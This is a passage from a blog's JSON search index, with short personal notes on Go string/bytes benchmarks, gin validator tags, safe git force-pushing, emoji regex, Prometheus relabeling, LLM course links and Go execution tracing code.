B/op\t0 allocs/op string 转 bytes 性能最好的是 k8s 方案，新型转换和传统转换性能差不多，新型方案略好，强制转换性能最差。\n而对于 bytes 转 string，k8s 方案性能最好，传统转换次之，新型转换性能再次之，强制转换性能非常不好。\n在 Linux amd64 上运行，go1.22.0 linux/amd64，结果如下： goos: linux goarch: amd64 pkg: test cpu: Intel(R) Xeon(R) Platinum BenchmarkStringToBytes/强制转换-2 30606319\t42.02 ns/op\t16 B/op\t1 allocs/op BenchmarkStringToBytes/传统转换-2 315913948\t3.779 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/新型转换-2 411972518\t2.753 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/k8s转换-2 449640819\t2.770 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/强制转换-2 38716465\t29.18 ns/op\t16 B/op\t1 allocs/op BenchmarkBytesToString/传统转换-2 458832459\t2.593 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/新型转换-2 439537762\t2.762 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/k8s转换-2 478885546\t2.375 ns/op\t0 B/op\t0 allocs/op 整体上看，k8s 方案、传统转换、新型转换性能都挺好，强制转换性能最差。k8s 在 bytes 转 string 上性能最好。\n","date":"August 20, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240820-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://juejin.cn/post/6863765115456454664\" target=\"_blank\" rel=\"noopener\"\u003e学会 gin 参数校验之 validator 库，看这一篇就足够了\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"字符串约束\"\u003e字符串约束\u003c/h3\u003e\n\u003cp\u003eexcludesall：不包含参数中任意的 UNICODE 字符，例如 excludesall=ab\u003c/p\u003e\n\u003cp\u003eexcludesrune：不包含参数表示的 rune 字符，excludesrune=asong\u003c/p\u003e\n\u003cp\u003estartswith：以参数子串为前缀，例如 startswith=hi\u003c/p\u003e\n\u003cp\u003eendswith：以参数子串为后缀，例如 endswith=bye。\u003c/p\u003e\n\u003cp\u003econtains=：包含参数子串，例如 contains=email\u003c/p\u003e\n\u003cp\u003econtainsany：包含参数中任意的 UNICODE 字符，例如 containsany=ab\u003c/p\u003e\n\u003cp\u003econtainsrune：包含参数表示的 rune 字符，例如`containsrune=asong\u003c/p\u003e\n\u003cp\u003eexcludes：不包含参数子串，例如 excludes=email\u003c/p\u003e\n\u003ch3 id=\"范围约束\"\u003e范围约束\u003c/h3\u003e\n\u003cp\u003e范围约束的字段类型分为三种：\u003c/p\u003e\n\u003cp\u003e对于数值，我们则可以约束其值\n对于切片、数组和 map，我们则可以约束其长度\n对于字符串，我们则可以约束其长度\u003c/p\u003e\n\u003ch4 id=\"常用-tag-介绍\"\u003e常用 tag 介绍：\u003c/h4\u003e\n\u003cp\u003ene：不等于参数值，例如 ne=5\ngt：大于参数值，例如 gt=5\ngte：大于等于参数值，例如 gte=50\nlt：小于参数值，例如 lt=50\nlte：小于等于参数值，例如 lte=50\noneof：只能是列举出的值其中一个，这些值必须是数值或字符串，以空格分隔，如果字符串中有空格，将字符串用单引号包围，例如 oneof=male female。\neq：等于参数值，注意与 len 不同。对于字符串，eq 约束字符串本身的值，而 len 约束字符串长度。例如 eq=10\nlen：等于参数值，例如 len=10\nmax：小于等于参数值，例如 max=10\nmin：大于等于参数值，例如 min=10\u003c/p\u003e\n\u003ch3 id=\"fields-约束\"\u003eFields 约束\u003c/h3\u003e\n\u003cp\u003eeqfield：定义字段间的相等约束，用于约束同一结构体中的字段。例如：eqfield=Password\neqcsfield：约束统一结构体中字段等于另一个字段（相对），确认密码时可以使用，例如：eqfiel=ConfirmPassword\nnefield：用来约束两个字段是否相同，确认两种颜色是否一致时可以使用，例如：nefield=Color1\nnecsfield：约束两个字段是否相同（相对）\u003c/p\u003e\n\u003ch3 id=\"常用约束\"\u003e常用约束\u003c/h3\u003e\n\u003cp\u003eunique：指定唯一性约束，不同类型处理不同：\u003c/p\u003e","tags":["golang","URL","GIN","byte","string"],"title":"Go articles"},{"categories":["git","URL","push"],"contents":" https://www.jvt.me/posts/2021/10/23/undo-force-push/ https://www.jvt.me/posts/2018/09/18/safely-force-git-push/ git push --force-with-lease ","date":"July 26, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240726-git/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.jvt.me/posts/2021/10/23/undo-force-push/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.jvt.me/posts/2021/10/23/undo-force-push/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.jvt.me/posts/2018/09/18/safely-force-git-push/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.jvt.me/posts/2018/09/18/safely-force-git-push/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit push --force-with-lease\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["git","URL","push"],"title":"Git force push"},{"categories":["golang","URL","leetcode"],"contents":" https://books.halfrost.com/leetcode/ ","date":"June 20, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240620-leetcode/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://books.halfrost.com/leetcode/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://books.halfrost.com/leetcode/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["golang","URL","leetcode"],"title":"Go leetcode"},{"categories":["regex","URL","emoji"],"contents":" Emoji Regular expression /\\p{Emoji}/u\n既然是匹配 Emoji，那么 loneProperty (\\p{loneProperty}) 就应该是 Emoji ? 实际测试并不符合需求，因为在 Emoji 官方文档中， 123456789*# 也是被看作是 Emoji， 如果用这个正则的话，就会把数字也认为是 Emoji，不符合只排除特殊表情的要求。\n/\\p{Extended_Pictographic}/u\n而 Extended_Pictographic 表示的 Emoji 才是我们认为的那些表情符号。\n","date":"May 19, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240519-emoji-regexp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taxodium.ink/post/emoji-regexp/\" target=\"_blank\" rel=\"noopener\"\u003eEmoji Regular expression\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003e/\\p{Emoji}/u\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e既然是匹配 Emoji，那么 loneProperty (\\p{loneProperty}) 就应该是 Emoji ? 实际测试并不符合需求，因为在 Emoji 官方文档中， 123456789*# 也是被看作是 Emoji， 如果用这个正则的话，就会把数字也认为是 Emoji，不符合只排除特殊表情的要求。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/\\p{Extended_Pictographic}/u\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e而 Extended_Pictographic 表示的 Emoji 才是我们认为的那些表情符号。\u003c/p\u003e","tags":["regex","URL","emoji"],"title":"Emoji Regular expression"},{"categories":["Prometheus","URL"],"contents":" How to use relabeling in Prometheus and VictoriaMetrics Interpreting Prometheus metrics for Linux disk I/O utilization Adding new label\n- target_label: \u0026#34;foo\u0026#34; replacement: \u0026#34;bar\u0026#34; metrics\nrkB/s: rate(node_disk_read_bytes_total[*]) Unit: bytes per second wkB/s: rate(node_disk_written_bytes_total[*]) Unit: bytes per second ","date":"May 14, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240514-prometheus/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://valyala.medium.com/how-to-use-relabeling-in-prometheus-and-victoriametrics-8b90fc22c4b2\" target=\"_blank\" rel=\"noopener\"\u003eHow to use relabeling in Prometheus and VictoriaMetrics\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://brian-candler.medium.com/interpreting-prometheus-metrics-for-linux-disk-i-o-utilization-4db53dfedcfc\" target=\"_blank\" rel=\"noopener\"\u003eInterpreting Prometheus metrics for Linux disk I/O utilization\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eAdding new label\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003etarget_label\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ereplacement\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cem\u003emetrics\u003c/em\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erkB/s:\n\u003ccode\u003erate(node_disk_read_bytes_total[*])\u003c/code\u003e\nUnit: bytes per second\u003c/li\u003e\n\u003cli\u003ewkB/s:\n\u003ccode\u003erate(node_disk_written_bytes_total[*])\u003c/code\u003e\nUnit: bytes per second\u003c/li\u003e\n\u003c/ul\u003e","tags":["Prometheus","URL"],"title":"Prometheus relabeling and linux metrics"},{"categories":["llm","machinelearning","URL"],"contents":" 大型語言模型 LLMs 課程教學 課程大綱 (四) 大型語言模型 LLMs 課程教學 課程大綱 (五) 大型語言模型 LLMs 課程教學 課程大綱 (六) LM STUDIO chromadb/chroma ollama/ollama mintplexlabs/anythingllm ","date":"May 10, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240510-llm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@whYPD8MBSHWRZV6y-ymFwQ/ryqUCfu6T\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (四)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/cZPGG0gQRCuG7pZGV-SlEg\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (五)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@whYPD8MBSHWRZV6y-ymFwQ/Bk3TbayAp\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (六)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eLM STUDIO\u003c/li\u003e\n\u003cli\u003echromadb/chroma\u003c/li\u003e\n\u003cli\u003eollama/ollama\u003c/li\u003e\n\u003cli\u003emintplexlabs/anythingllm\u003c/li\u003e\n\u003c/ol\u003e","tags":["llm","machinelearning","URL"],"title":"LLMs Hackmd Docs"},{"categories":["URL","Go","trace"],"contents":" 更强大的 Go 执行跟踪能力 runtime/trace golang.org/x/exp/trace 飞行记录(flight recording) // 设置飞行记录器 fr := trace.NewFlightRecorder() fr.Start() // 设置和运行HTTP服务器 var once sync.Once http.HandleFunc(\u0026#34;/my-endpoint\u0026#34;, func(w http.ResponseWriter, r *http.Request) { start := time.Now() // 干些事情 doWork(w, r) // 盼到了长耗时请求，来个快照 if time.Since(start) \u0026gt; 300*time.Millisecond { // 这里我们为了简化只做一次，实际上你可以做多次 once.Do(func() { // 抓取快照 var b bytes.Buffer _, err = fr.WriteTo(\u0026amp;b) if err != nil { log.Print(err) return } // 把快照写入文件 if err := os.WriteFile(\u0026#34;trace.out\u0026#34;, b.Bytes(), 0o755); err != nil { log.Print(err) return } }) } }) log.Fatal(http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil)) 跟踪读取器 API // 开始从标准输入读取跟踪数据。 r, err := trace.NewReader(os.Stdin) if err != nil { log.Fatal(err) } var blocked int var blockedOnNetwork int for { // 读取事件 ev, err := r.ReadEvent() if err == io.EOF { break } else if err != nil { log.Fatal(err) } // 处理它 if ev.Kind() == trace.EventStateTransition { st := ev.StateTransition() if st.Resource.Kind == trace.ResourceGoroutine { id := st.Resource.Goroutine() from, to := st.GoroutineTransition() // 查找阻塞的goroutine, 统计计数 if from.Executing() \u0026amp;\u0026amp; to == trace.GoWaiting { blocked++ if strings.Contains(st.Reason, \u0026#34;network\u0026#34;) { blockedOnNetwork++ } } } } } // 打印我们所需 p := 100 * float64(blockedOnNetwork) / float64(blocked) fmt.Printf(\u0026#34;%2.3f%% instances of goroutines blocking were to block on the network\\n\u0026#34;, p) ","date":"May 7, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240507-go-trace/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://colobu.com/2024/03/18/execution-traces-2024/\" target=\"_blank\" rel=\"noopener\"\u003e更强大的 Go 执行跟踪能力\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"runtimetrace\"\u003eruntime/trace\u003c/h3\u003e\n\u003ch3 id=\"golangorgxexptrace\"\u003egolang.org/x/exp/trace\u003c/h3\u003e\n\u003ch4 id=\"飞行记录flight-recording\"\u003e飞行记录(flight recording)\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 设置飞行记录器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewFlightRecorder\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStart\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 设置和运行HTTP服务器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eonce\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eOnce\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eHandleFunc\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/my-endpoint\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eResponseWriter\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNow\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 干些事情\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edoWork\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 盼到了长耗时请求，来个快照\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSince\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e) \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMillisecond\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// 这里我们为了简化只做一次，实际上你可以做多次\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eonce\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDo\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 抓取快照\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebytes\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBuffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003efr\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteTo\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e// 把快照写入文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWriteFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;trace.out\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBytes\u003c/span\u003e(), \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eo755\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eListenAndServe\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:8080\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"跟踪读取器-api\"\u003e跟踪读取器 API\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 开始从标准输入读取跟踪数据。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eStdin\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblocked\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eblockedOnNetwork\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 读取事件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadEvent\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003elog\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e// 处理它\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eev\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eKind\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrace\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEventStateTransition\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003est\u003c/span\u003e 